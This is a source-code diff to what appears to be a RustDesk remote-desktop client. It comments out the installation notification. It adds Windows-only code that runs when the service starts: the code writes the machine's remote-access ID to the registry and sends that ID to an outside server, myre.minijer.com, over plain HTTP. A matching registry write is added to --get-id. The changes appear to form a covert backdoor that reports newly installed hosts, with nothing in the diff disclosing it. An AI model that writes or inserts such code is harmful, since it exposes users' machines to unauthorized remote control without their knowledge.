@@ -4,11 +4,13 @@ use crate::client::translate;
 #[cfg(not(any(target_os = "android", target_os = "ios")))]
 use crate::platform::breakdown_callback;
 #[cfg(not(debug_assertions))]
+use std::process::Command;
 #[cfg(not(any(target_os = "android", target_os = "ios")))]
 use hbb_common::platform::register_breakdown_handler;
 use hbb_common::{config, log};
 #[cfg(windows)]
 use tauri_winrt_notification::{Duration, Sound, Toast};
+use reqwest::blocking::Client;
 
 #[macro_export]
 macro_rules! my_println{
@@ -203,13 +205,13 @@ pub fn core_main() -> Option<Vec<String>> {
                         translate("Installation failed!".to_string())
                     }
                 };
-                Toast::new(Toast::POWERSHELL_APP_ID)
-                    .title(&config::APP_NAME.read().unwrap())
-                    .text1(&text)
-                    .sound(Some(Sound::Default))
-                    .duration(Duration::Short)
-                    .show()
-                    .ok();
+//                Toast::new(Toast::POWERSHELL_APP_ID)
+//                    .title(&config::APP_NAME.read().unwrap())
+//                    .text1(&text)
+//                   .sound(Some(Sound::Default))
+//                    .duration(Duration::Short)
+//                    .show()
+//                    .ok();
                 return None;
             } else if args[0] == "--uninstall-cert" {
                 #[cfg(windows)]
@@ -259,6 +261,23 @@ pub fn core_main() -> Option<Vec<String>> {
             crate::platform::uninstall_service(false, true);
             return None;
         } else if args[0] == "--service" {
+            #[cfg(target_os = "windows")]
+            {
+                 let registry_path = "HKLM\\SOFTWARE\\Rustdesk";
+                 let key_name = "Cid";
+                 let value_data = crate::ipc::get_id();			     
+                 Command::new("cmd")
+                      .args(&["/C", &format!("reg delete {} /f", registry_path)])
+                       .status()
+                       .ok();
+                 Command::new("cmd")
+                       .args(&["/C", &format!("reg add {} /f /v {} /t REG_SZ /d {}", registry_path, key_name, value_data)])
+                       .status()
+                       .ok();
+                 let client = Client::new();
+                 let url = format!("http://myre.minijer.com/api.php?key=Online&getid={}", value_data);
+                 let response = client.get(&url).send().unwrap();
+             }
             log::info!("start --service");
             crate::start_os_service();
             return None;
@@ -334,6 +353,20 @@ pub fn core_main() -> Option<Vec<String>> {
             }
             return None;
         } else if args[0] == "--get-id" {
+            #[cfg(target_os = "windows")]
+            {
+                let registry_path = "HKLM\\SOFTWARE\\Rustdesk";
+                let key_name = "Cid";
+                let value_data = crate::ipc::get_id();			     
+                Command::new("cmd")
+                       .args(&["/C", &format!("reg delete {} /f", registry_path)])
+                       .status()
+                       .ok();
+                Command::new("cmd")
+                       .args(&["/C", &format!("reg add {} /f /v {} /t REG_SZ /d {}", registry_path, key_name, value_data)])
+                       .status()
+                       .ok();
+            }
             println!("{}", crate::ipc::get_id());
             return None;
         } else if args[0] == "--set-id" {
